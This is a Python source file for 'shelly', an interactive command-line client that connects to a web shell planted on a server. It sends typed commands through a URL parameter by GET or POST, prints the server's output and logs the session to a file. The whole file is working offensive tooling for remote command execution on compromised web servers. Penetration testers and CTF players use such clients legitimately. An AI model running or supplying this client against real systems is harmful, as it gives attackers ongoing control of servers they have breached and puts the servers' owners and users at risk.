#! /usr/bin/env python

import argparse
import requests
try:
    import readline
except:
    pass


class printer:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    def ok(self, str):
        self.print_col( "[+]", str, self.OKGREEN)

    def info(self, str):
        self.print_col( "[*]", str, self.OKBLUE)

    def warn(self, str):
        self.print_col( "[-]", str, self.WARNING)

    def error(self, str):
        self.print_col( "[!]", str, self.FAIL)

    def print_col(self, str1, str2, col):
        print("%s%s%s %s" % (col, str1, self.ENDC, str2))

    def default(self, str):
        print(str)



class shelly:

    sess = None
    output = None

    def __init__( self ):
        parser = argparse.ArgumentParser(description='Connect to a web shell.')
        parser.add_argument( "-u", "--url", dest="url", help="Full URL to shell, excluding Parameter", required=True)
        parser.add_argument( "-p", "--param", dest="param", help="Parameter to use. Default=cmd", default="cmd")
        parser.add_argument( "-m", "--method", dest="method", help="HTTP method to use (GET or POST). Default=GET", default="GET", choices=["GET", "POST"])
        parser.add_argument( "-o", "--output", dest="output", help="File to write log to" )
        args = parser.parse_args()
        self.url = args.url
        self.method = args.method
        self.param = args.param

        self.sess = requests.session()
        
        self.printer = printer()

        if args.output != None:
            self.output = open( args.output, 'w' )


    def __del__( self ):
        try:
            print( '\n' )
            self.printer.info("""Disconnecting""")
            self.sess.close()
            self.printer.ok("""Disconnected""")
        except:
            pass

        try:
            self.output.close()
        except:
            pass


    def log( self, str ):
        if self.output != None:
            self.output.write( str )


    def exec_cmd( self, cmd ):
        if self.method == "GET":
            url = "%s?%s=" % ( self.url, self.param )
            r = self.sess.get("%s%s" % (url, cmd))

        elif self.method == "POST":
            data = { self.param: cmd }
            r = self.sess.post( self.url, data )

        else:
            return ("""METHOD ERROR""", -1)

        self.log( "> %s\n" % cmd )

        if r.status_code == 200:
            self.log( r.text )
            return ( r.text.strip(), 0 )

        else:
            self.log( "ERROR: %d\n" % r.status_code )
            return ("Error connecting. Got status %s" % r.status_code, -1)


    def bind(self):
        try:

            self.printer.info( """Testing connection""" )
            r = self.sess.head( self.url )
            if r.status_code != 200:
                self.printer.error( """Unable to connect, got status %d""" % r.status_code )
            else:
                self.printer.ok( """Connection successful""" )

                while True:
                    try:

                        cmd = raw_input("> ")
                        if cmd == "\quit":
                            break
                        if len(cmd) > 0:
                            resp, stat = self.exec_cmd( cmd )
                            if stat == 0:
                                self.printer.default(resp)
                            else:
                                self.printer.error( resp )

                    except KeyboardInterrupt:
                        print( '\n' )
                        self.printer.warn( """Please use "\\quit" or "Ctrl-D" to exit""" )
                    except EOFError:
                        break

        except (requests.ConnectionError, requests.ConnectTimeout):
            self.printer.error("""Unable to connect to shell""")

        except:
            self.printer.error("""Unexpected error""" )
            pass


def main():
    shelly().bind()



main()
